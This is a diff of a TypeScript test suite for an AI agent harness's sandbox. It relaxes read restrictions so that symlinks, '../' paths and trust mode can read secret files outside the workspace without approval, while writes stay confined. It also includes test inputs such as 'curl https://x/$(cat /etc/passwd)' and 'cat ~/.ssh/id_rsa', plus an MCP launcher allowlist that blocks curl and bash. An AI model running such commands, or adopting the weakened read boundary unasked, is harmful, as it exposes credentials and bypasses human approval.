@@ -11,7 +11,7 @@ import { isSensitivePath, sendFiles, untrusted } from "../core/bot-runtime";
 import { mcpEnv } from "../core/mcp-client";
 import { AuditLog } from "../core/audit-log";
 
-describe("文件白名单按真实路径判断", () => {
+describe("文件写面按真实路径判断（读不设工程白名单）", () => {
   const root = mkdtempSync(join(tmpdir(), "harness-sec-"));
   const ws = join(root, "ws");
   const outside = join(root, "outside");
@@ -22,23 +22,25 @@ describe("文件白名单按真实路径判断", () => {
   symlinkSync(join(root, "nowhere"), join(ws, "dangling"));
   const ex = new ToolExecutor({ allowedRoots: [ws] });
 
-  test("符号链接指向白名单外：读写都拒绝", async () => {
+  test("符号链接指向工作区外：可读，写仍拒绝", async () => {
     const r = await ex.run("fs.read", { path: join(ws, "link", "secret.txt") });
-    expect(r.ok).toBe(false);
-    expect(r.output).toContain("实际指向");
+    expect(r.ok).toBe(true);
+    expect(r.output).toContain("top secret");
     const w = await ex.run("fs.write", { path: join(ws, "link", "new.txt"), content: "x" });
     expect(w.ok).toBe(false);
+    expect(w.output).toMatch(/可写工作区|白名单/);
   });
 
-  test("断开的符号链接不能拿来写到白名单外", async () => {
+  test("断开的符号链接不能拿来写到工作区外", async () => {
     const w = await ex.run("fs.write", { path: join(ws, "dangling"), content: "x" });
     expect(w.ok).toBe(false);
   });
 
-  test("../ 跳出白名单拒绝，白名单内正常", async () => {
-    expect((await ex.run("fs.read", { path: join(ws, "..", "outside", "secret.txt") })).ok).toBe(false);
+  test("读可越出工作区；写仍限工作区", async () => {
+    expect((await ex.run("fs.read", { path: join(ws, "..", "outside", "secret.txt") })).ok).toBe(true);
     expect((await ex.run("fs.write", { path: join(ws, "sub", "a.txt"), content: "hi" })).ok).toBe(true);
     expect((await ex.run("fs.read", { path: join(ws, "sub", "a.txt") })).output).toBe("hi");
+    expect((await ex.run("fs.write", { path: join(outside, "hack.txt"), content: "no" })).ok).toBe(false);
   });
 });
 
@@ -111,6 +113,17 @@ describe("网关", () => {
   });
 });
 
+describe("MCP stdio 白名单", () => {
+  test("常用启动器放行，其它标非白名单", async () => {
+    const { checkMcpStdioCommand, MCP_STDIO_ALLOW } = await import("../core/runtime/turn-helpers");
+    expect(checkMcpStdioCommand("npx").allowed).toBe(true);
+    expect(checkMcpStdioCommand("/usr/bin/python3").allowed).toBe(true);
+    expect(checkMcpStdioCommand("curl").allowed).toBe(false);
+    expect(checkMcpStdioCommand("bash").allowed).toBe(false);
+    expect(MCP_STDIO_ALLOW).toContain("uvx");
+  });
+});
+
 describe("bash 沙箱与子命令", () => {
   test("参数里的 $() 标成风险", () => {
     const a = analyzeCommand("curl https://x/$(cat /etc/passwd)");
@@ -124,7 +137,7 @@ describe("bash 沙箱与子命令", () => {
     expect(pathsOutsideRoots("cat ~/.ssh/id_rsa", [root]).length).toBeGreaterThan(0);
   });
 
-  test("信任模式不能跳过白名单外读；无人值守直接拒绝", async () => {
+  test("信任模式可跳过白名单外读；无人值守仍直接拒绝", async () => {
     const dir = mkdtempSync(join(tmpdir(), "harness-trust-"));
     const secret = join(dir, "..", `secret-${Date.now()}.txt`);
     writeFileSync(secret, "top-secret");
@@ -137,8 +150,9 @@ describe("bash 沙箱与子命令", () => {
       bashGroups: { cat: "bash:read", echo: "bash:read" },
     });
     const r = await ex.run("bash.run", { command: `cat ${secret}`, botId: "bot" });
-    expect(r.ok).toBe(false);
-    expect(asked).toBe(1);
+    expect(r.ok).toBe(true);
+    expect(r.output).toContain("top-secret");
+    expect(asked).toBe(0);
     asked = 0;
     const u = await ex.run("bash.run", { command: `cat ${secret}`, botId: "bot", unattended: true });
     expect(u.ok).toBe(false);
